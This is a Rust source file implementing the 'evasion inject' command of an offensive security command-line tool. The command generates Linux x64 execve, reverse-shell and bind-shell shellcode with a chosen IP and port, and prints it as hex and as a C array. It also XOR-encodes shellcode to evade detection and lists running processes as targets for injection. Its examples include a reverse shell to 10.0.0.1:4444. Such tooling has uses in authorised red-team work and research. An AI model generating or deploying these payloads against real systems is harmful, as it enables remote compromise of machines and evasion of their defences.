//! Process injection and shellcode command

use crate::cli::output::Output;
use crate::cli::CliContext;
use crate::json;
use crate::modules::evasion::inject;

use crate::cli::commands::{Command, Flag, Route};

pub struct EvasionInjectCommand;

impl Command for EvasionInjectCommand {
  fn domain(&self) -> &str {
    "evasion"
  }

  fn resource(&self) -> &str {
    "inject"
  }

  fn description(&self) -> &str {
    "Process injection and shellcode generation"
  }

  fn routes(&self) -> Vec<Route> {
    vec![
      Route {
        verb: "shellcode",
        summary: "Generate shellcode payload",
        usage: "rb evasion inject shellcode <type> [--ip <ip>] [--port <port>]",
      },
      Route {
        verb: "encode",
        summary: "XOR encode shellcode",
        usage: "rb evasion inject encode <hex> [--key <n>]",
      },
      Route {
        verb: "list",
        summary: "List injectable processes",
        usage: "rb evasion inject list [--filter <name>]",
      },
    ]
  }

  fn flags(&self) -> Vec<Flag> {
    vec![
      Flag::new("ip", "IP address for reverse shell")
        .with_short('i')
        .with_default("127.0.0.1"),
      Flag::new("port", "Port for shell")
        .with_short('p')
        .with_default("4444"),
      Flag::new("key", "XOR encoding key")
        .with_short('k')
        .with_default("0x41"),
      Flag::new("filter", "Filter processes by name"),
      Flag::new("format", "Output format (text, json)").with_default("text"),
    ]
  }

  fn examples(&self) -> Vec<(&str, &str)> {
    vec![
      (
        "Generate execve shellcode",
        "rb evasion inject shellcode shell",
      ),
      (
        "Reverse shell",
        "rb evasion inject shellcode reverse --ip 10.0.0.1 --port 4444",
      ),
      ("Bind shell", "rb evasion inject shellcode bind --port 4444"),
      (
        "Encode shellcode",
        "rb evasion inject encode 4831c050... --key 0x42",
      ),
      ("List processes", "rb evasion inject list"),
    ]
  }

  fn execute(&self, ctx: &CliContext) -> Result<(), String> {
    let verb = ctx.verb.as_deref().unwrap_or("shellcode");

    match verb {
      "shellcode" => execute_inject_shellcode(ctx),
      "encode" => execute_inject_encode(ctx),
      "list" => execute_inject_list(ctx),
      _ => Err(format!("Unknown verb: {}", verb)),
    }
  }
}

fn execute_inject_shellcode(ctx: &CliContext) -> Result<(), String> {
  let format = ctx.get_flag("format").unwrap_or_else(|| "text".to_string());
  let is_json = format == "json";

  let shellcode_type = ctx.target.as_deref().unwrap_or("shell");

  let ip_str = ctx
    .flags
    .get("ip")
    .map(|s| s.as_str())
    .unwrap_or("127.0.0.1");
  let port: u16 = ctx
    .flags
    .get("port")
    .and_then(|s| s.parse().ok())
    .unwrap_or(4444);

  let (shellcode, description) = match shellcode_type {
    "shell" | "exec" => (
      inject::Shellcode::linux_x64_shell(),
      "Linux x64 execve(/bin/sh)",
    ),
    "reverse" | "rev" => {
      // Parse IP address to [u8; 4]
      let parts: Vec<u8> = ip_str.split('.').filter_map(|s| s.parse().ok()).collect();
      if parts.len() != 4 {
        return Err(format!("Invalid IP address: {}", ip_str));
      }
      let ip: [u8; 4] = [parts[0], parts[1], parts[2], parts[3]];
      let desc = format!("Linux x64 Reverse Shell to {}:{}", ip_str, port);
      (
        inject::Shellcode::linux_x64_reverse_shell(ip, port),
        desc.leak() as &str,
      )
    }
    "bind" => {
      let desc = format!("Linux x64 Bind Shell on port {}", port);
      (
        inject::Shellcode::linux_x64_bind_shell(port),
        desc.leak() as &str,
      )
    }
    _ => {
      return Err(format!(
        "Unknown shellcode type: {}. Use: shell, reverse, bind",
        shellcode_type
      ))
    }
  };

  let hex: String = shellcode
    .bytes()
    .iter()
    .map(|b| format!("{:02x}", b))
    .collect();
  let null_free = !shellcode.bytes().contains(&0);

  if is_json {
    Output::json_value(&json!({
        "type": shellcode_type,
        "description": description,
        "size": shellcode.len(),
        "null_free": null_free,
        "hex": hex,
        "bytes": shellcode.bytes().to_vec()
    }));
    return Ok(());
  }

  Output::header("Shellcode Generator");
  println!();
  Output::info(description);

  println!();
  Output::item("Size", &format!("{} bytes", shellcode.len()));
  Output::item("Null-free", &format!("{}", null_free));

  println!();
  Output::info("Hex:");
  // Print in chunks of 32 chars (16 bytes)
  for chunk in hex.as_bytes().chunks(64) {
    println!("    {}", std::str::from_utf8(chunk).unwrap_or(""));
  }

  println!();
  Output::info("C array:");
  println!("    unsigned char shellcode[] = {{");
  for chunk in shellcode.bytes().chunks(12) {
    let line: String = chunk
      .iter()
      .map(|b| format!("0x{:02x}", b))
      .collect::<Vec<_>>()
      .join(", ");
    println!("        {},", line);
  }
  println!("    }};");

  Ok(())
}

fn execute_inject_encode(ctx: &CliContext) -> Result<(), String> {
  let hex_data = ctx
    .target
    .as_ref()
    .ok_or("Missing hex shellcode to encode")?;

  let key: u8 = ctx
    .flags
    .get("key")
    .and_then(|s| {
      if s.starts_with("0x") || s.starts_with("0X") {
        u8::from_str_radix(&s[2..], 16).ok()
      } else {
        s.parse().ok()
      }
    })
    .unwrap_or(0x41);

  Output::header("XOR Encoder");
  println!();

  // Parse hex
  let bytes: Result<Vec<u8>, _> = (0..hex_data.len())
    .step_by(2)
    .map(|i| {
      u8::from_str_radix(
        &hex_data[i..i.min(hex_data.len()) + 2.min(hex_data.len() - i)],
        16,
      )
    })
    .collect();

  let bytes = bytes.map_err(|_| "Invalid hex string")?;

  Output::item("Original size", &format!("{} bytes", bytes.len()));
  Output::item("XOR key", &format!("0x{:02X}", key));

  let mut shellcode = inject::Shellcode::new(bytes, inject::Architecture::current());
  shellcode.xor_encode(key);

  println!();
  Output::info("Encoded:");
  Output::item("Total size", &format!("{} bytes", shellcode.len()));

  let hex: String = shellcode
    .bytes()
    .iter()
    .map(|b| format!("{:02x}", b))
    .collect();
  for chunk in hex.as_bytes().chunks(64) {
    println!("    {}", std::str::from_utf8(chunk).unwrap_or(""));
  }

  println!();
  Output::info("To add decoder stub, use with_xor_decoder()");

  Ok(())
}

fn execute_inject_list(ctx: &CliContext) -> Result<(), String> {
  let filter = ctx.flags.get("filter");

  Output::header("Process List");
  println!();

  let processes = inject::ProcessInjector::list_processes();

  Output::info(&format!("Found {} processes", processes.len()));
  println!();

  println!("    {:>6}  NAME", "PID");
  println!("    {:->6}  {:->30}", "", "");

  let mut count = 0;
  for (pid, name) in &processes {
    if let Some(f) = filter {
      if !name.to_lowercase().contains(&f.to_lowercase()) {
        continue;
      }
    }

    println!("    {:>6}  {}", pid, name);
    count += 1;

    if count >= 50 && filter.is_none() {
      println!(
        "    ... ({} more, use --filter to narrow)",
        processes.len() - 50
      );
      break;
    }
  }

  Ok(())
}
